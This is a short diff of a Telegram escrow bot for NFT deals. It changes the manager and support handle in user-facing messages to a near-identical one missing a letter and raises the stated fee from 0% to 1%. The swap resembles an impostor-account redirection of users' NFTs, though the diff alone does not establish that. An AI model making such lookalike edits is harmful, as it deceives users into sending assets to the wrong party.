@@ -416,7 +416,7 @@ TEXTS = {
             "📦 Товар: {description}\n\n"
             "⚠️ **Менеджер не получил NFT!**\n\n"
             "📌 **Дальнейшие действия:**\n"
-            "1. Передайте NFT менеджеру @CryptoDealsEscrow\n"
+            "1. Передайте NFT менеджеру @CryptoDealsEscro\n"
             "2. После передачи снова нажмите 'Подать заявку на передачу NFT'\n"
             "3. Менеджер подтвердит получение\n"
             "4. Средства будут зачислены на ваш баланс\n\n"
@@ -486,9 +486,9 @@ TEXTS = {
             "✨ Automated execution algorithm.\n"
             "⚡️ Speed and automation.\n"
             "💳 Convenient and fast withdrawal of funds.\n\n"
-            "• Service fee: 0%\n"
+            "• Service fee: 1%\n"
             "• Working hours: 24/7\n"
-            "• Technical support: @CryptoDealsEscrow\n\n"
+            "• Technical support: @CryptoDealsEscro\n\n"
             "🛡️ Choose the desired section below:"
         ),
         'choose_language': "🌐 Please choose your language:",
@@ -2882,4 +2882,5 @@ def run_bot():
 if __name__ == "__main__":
     threading.Thread(target=run_http_server, daemon=True).start()
     run_bot()
+
 
